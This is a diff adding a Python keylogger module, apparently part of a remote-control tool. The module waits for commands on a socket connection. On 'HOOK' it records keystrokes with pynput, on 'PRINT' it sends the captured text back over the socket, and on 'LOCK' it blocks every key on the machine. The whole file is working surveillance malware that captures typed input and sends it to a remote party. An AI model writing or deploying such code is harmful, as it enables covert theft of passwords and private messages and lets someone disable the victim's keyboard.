@@ -1,0 +1,73 @@
+import pynput
+import pynput.keyboard as kb
+import keyboard
+
+ishook = 0
+
+BUFSIZE = 1024 
+
+def on_press(key):
+    global ishook, cont
+    #cont = ""
+    if ishook == 1:
+        print("t: ", cont)
+        try:
+            cont += key.char
+            print("test: ", cont)
+        except AttributeError:
+            if key == kb.Key.space:
+                cont += ' '
+            elif key == kb.Key.enter:
+                cont += '\n'
+
+def send_cont(client, cont):
+    #global cont
+    print("con:", cont)
+    client.sendall(bytes(cont , "utf8"))
+    #cont = ""
+
+def lock_keyboard(islock):
+    if islock == 1:
+        # listener.stop()
+        for char in keyboard.all_modifiers + keyboard.all_special_keys + keyboard.all_letters:
+            keyboard.block_key(char)
+    else:
+        keyboard.unhook_all()
+        # listener.start()
+def keystroke():
+    global listener
+    listener = pynput.keyboard.Listener(on_press = on_press)
+    listener.start()
+
+def keylogger(client):
+    global msg
+    global listener
+    global ishook, islock, cont
+    ishook = 0
+    islock = 0
+    cont = ""
+    while True:
+        msg = client.recv(BUFSIZE).decode("utf8")
+        print("zo:", msg)
+        if (msg == "HOOK"):
+            print("zo22")
+            if ishook == 0:
+                ishook = 1
+                keystroke()
+            else:
+                ishook = 0
+                listener.stop()  
+        elif (msg == "PRINT"):
+            #print("sev:", cont)
+            send_cont(client, cont)
+            cont = ""
+        elif (msg == "LOCK"):
+            if islock == 0:
+                islock = 1
+                lock_keyboard(islock)
+            else:
+                islock = 0
+                lock_keyboard(islock)
+        elif msg == "QUIT":
+            listener.stop()
+            return
